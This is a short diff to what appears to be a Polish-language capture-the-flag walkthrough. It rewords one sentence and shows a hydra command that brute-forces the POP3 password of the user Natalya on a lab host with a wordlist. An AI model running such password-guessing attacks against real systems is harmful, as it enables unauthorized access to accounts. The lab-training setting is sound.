@@ -125,7 +125,7 @@ W serwisie znajdujemy wiadomości (emails). Dowiadujemy się z nich, że Natalya
 
 ![RETR](img/RETR.JPG)
 
-Kontynuujemy ataki za pomocą hydry, tym razem na użytkownika Natalya:
+Kontynuujemy ataki za pomocą hydry, tym razem na użytkowniku Natalya:
 
 ```
 hydra -l Natalya -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.63.124 -s 55007 pop3
